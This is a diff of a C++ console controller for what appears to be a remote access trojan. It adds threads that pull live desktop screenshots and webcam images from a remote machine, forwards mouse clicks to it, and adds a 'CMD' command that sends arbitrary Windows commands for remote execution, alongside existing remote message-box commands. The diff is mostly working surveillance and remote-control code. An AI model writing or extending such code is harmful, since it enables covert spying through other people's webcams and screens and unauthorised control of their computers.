@@ -33,16 +33,38 @@ void CallBackFunc(int event, int x, int y, int flags, void* userdata)
     if (event == cv::EVENT_LBUTTONDOWN)
     {
         cout << "Left button of the mouse is clicked - position (" << x << ", " << y << ")" << endl;
-        NH.SendDataT<int>(x);
-        NH.SendDataT<int>(y);
+        NH.SendDataType("MouseDown");
+        NH.SendDataT<int>(1);
     }
     else if (event == cv::EVENT_RBUTTONDOWN)
     {
         cout << "Right button of the mouse is clicked - position (" << x << ", " << y << ")" << endl;
+        NH.SendDataType("MouseDown");
+        NH.SendDataT<int>(2);
     }
     else if (event == cv::EVENT_MBUTTONDOWN)
     {
         cout << "Middle button of the mouse is clicked - position (" << x << ", " << y << ")" << endl;
+        NH.SendDataType("MouseDown");
+        NH.SendDataT<int>(3);
+    }
+    else if (event == cv::EVENT_LBUTTONUP)
+    {
+        //cout << "Mouse move over the window - position (" << x << ", " << y << ")" << endl;
+        NH.SendDataType("MouseUp");
+        NH.SendDataT<int>(1);
+    }
+    else if (event == cv::EVENT_RBUTTONUP)
+    {
+        //cout << "Mouse move over the window - position (" << x << ", " << y << ")" << endl;
+        NH.SendDataType("MouseUp");
+        NH.SendDataT<int>(2);
+    }
+    else if (event == cv::EVENT_MBUTTONUP)
+    {
+        //cout << "Mouse move over the window - position (" << x << ", " << y << ")" << endl;
+        NH.SendDataType("MouseUp");
+        NH.SendDataT<int>(3);
     }
     else if (event == cv::EVENT_MOUSEMOVE)
     {
@@ -53,7 +75,8 @@ void CallBackFunc(int event, int x, int y, int flags, void* userdata)
 
 void rcv() {
     DataType dt;
-    cv::Mat image;
+    cv::Mat Dimage;
+    cv::Mat Cimage;
     INPUT in;
 
     NH.AddDataType("DesktopIMG", 2);
@@ -83,31 +106,15 @@ void rcv() {
         }
         else if (dt.Name == "DesktopIMG")
         {
-
-            cv::resizeWindow(DesktopFeed, image.cols / 2, image.rows / 2);
-
-            cv::setMouseCallback(DesktopFeed, CallBackFunc, NULL);
-            NH.RecvCVMat(&image);
-
-
-            cv::imshow(DesktopFeed, image); // Show our image inside the created window.
-
-            if (cv::waitKey(10) == 27)
-            {
-                cout << "Esc key is pressed by user. Stoppig the video" << endl;
-                cv::destroyWindow(DesktopFeed);
+            if (cv::getWindowProperty(DesktopFeed, 0) >= 0) {
+                NH.RecvCVMat(&Dimage);
+                cv::imshow(DesktopFeed, Dimage); // Show our image inside the created window                
             }
         }
         else if (dt.Name == "CamIMG") {
-            NH.RecvCVMat(&image);
-
-
-            cv::imshow(CamFeed, image); // Show our image inside the created window.
-
-            if (cv::waitKey(10) == 27)
-            {
-                cout << "Esc key is pressed by user. Stoppig the video" << endl;
-                cv::destroyWindow(CamFeed);
+            if (cv::getWindowProperty(CamFeed, 0) >= 0) {
+                NH.RecvCVMat(&Cimage);
+                cv::imshow(CamFeed, Cimage); // Show our image inside the created window.
             }
         }
         else if (dt.Name == "MBAwnser") {
@@ -139,10 +146,38 @@ void rcv() {
     }
 }
 
+
+void DesktopFeedLoop() {
+    cv::namedWindow(DesktopFeed, cv::WINDOW_NORMAL);
+    cv::resizeWindow(DesktopFeed, 960, 540);
+    cv::setMouseCallback(DesktopFeed, CallBackFunc, NULL);
+    while (cv::getWindowProperty(DesktopFeed, cv::WND_PROP_VISIBLE) > 0) {
+        printf("%f", cv::getWindowProperty(DesktopFeed, cv::WND_PROP_VISIBLE));
+        NH.SendDataType("DesktopIMG");
+        cv::waitKey(1);
+        Sleep(500);
+    }
+    cv::destroyWindow(DesktopFeed);
+}
+
+void CamFeedLoop() {
+    cv::namedWindow(CamFeed, cv::WINDOW_NORMAL);
+    cv::resizeWindow(CamFeed, 500, 500);
+
+    while (cv::getWindowProperty(CamFeed, cv::WND_PROP_VISIBLE)>0) {
+        printf("%f", cv::getWindowProperty(CamFeed, cv::WND_PROP_VISIBLE));
+        NH.SendDataType("CamIMG");
+        cv::waitKey(1);
+        Sleep(500);
+    }
+    cv::destroyWindow(CamFeed);
+}
+
 int main()
 {
     thread recvThread;
-
+    thread DesktopThread;
+    thread CamThread;
     string input = "";
     string ip="None";
     string port= "None";
@@ -220,6 +255,7 @@ int main()
             NH.DisConnect();
         }
         else if (input == "Help") {
+            system("cls");
             SetConsoleTextAttribute(hConsole, 11);
             printf("Commands are: \n");
             printf("Connect \n");
@@ -228,6 +264,9 @@ int main()
             printf("Message \n");
             printf("MessageBox \n");
             printf("MessageBoxYN \n");
+            printf("CMD \n");
+            printf("DesktopFeed\n");
+            printf("CamFeed\n");
             continue;
         }
         else if (input == "Message") {
@@ -266,16 +305,27 @@ int main()
             NH.SendDataT<wstring>(s2ws(msg));
             continue;
         }
-        else if (input == "") {
-            
+        else if (input == "CMD") {
+            NH.SendDataType("CMD");
+            SetConsoleTextAttribute(hConsole, 10);
+            printf("Enter windows command: ");
+            SetConsoleTextAttribute(hConsole, 7);
+            getline(cin, input);
+            NH.SendDataT<string>(input);
         }
-        else if (input == "") {
-
+        else if (input == "DesktopFeed") {
+            DesktopThread = thread(DesktopFeedLoop);
+        }
+        else if (input == "CamFeed") {
+            CamThread = thread(CamFeedLoop);
         }
         else {
             cout << "Invalid Command!" << endl;
             continue;
         }
+        /*else if (input == "") {
+
+        }*/
         system("cls");
     }
     system("pause");
